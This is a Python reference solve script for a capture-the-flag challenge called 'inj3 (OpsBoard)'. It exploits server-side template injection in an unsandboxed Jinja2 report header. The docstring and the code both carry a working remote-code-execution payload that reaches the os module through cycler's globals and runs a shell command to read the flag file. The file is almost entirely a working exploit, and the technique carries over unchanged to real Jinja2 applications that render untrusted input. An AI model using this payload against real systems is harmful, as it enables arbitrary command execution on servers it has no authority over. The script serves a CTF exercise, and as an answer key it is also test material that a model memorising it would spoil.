#!/usr/bin/env python3
"""Reference solve for inj3 (OpsBoard).

The report header is rendered by an unsandboxed Jinja2 environment.
Recon: header "{{ 7 * 7 }}" renders as 49.
RCE through a jinja2 default global (cycler lives in jinja2.utils, which
imports os):

    {{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8042")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD = "{{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/report", data={"header": PAYLOAD}, timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
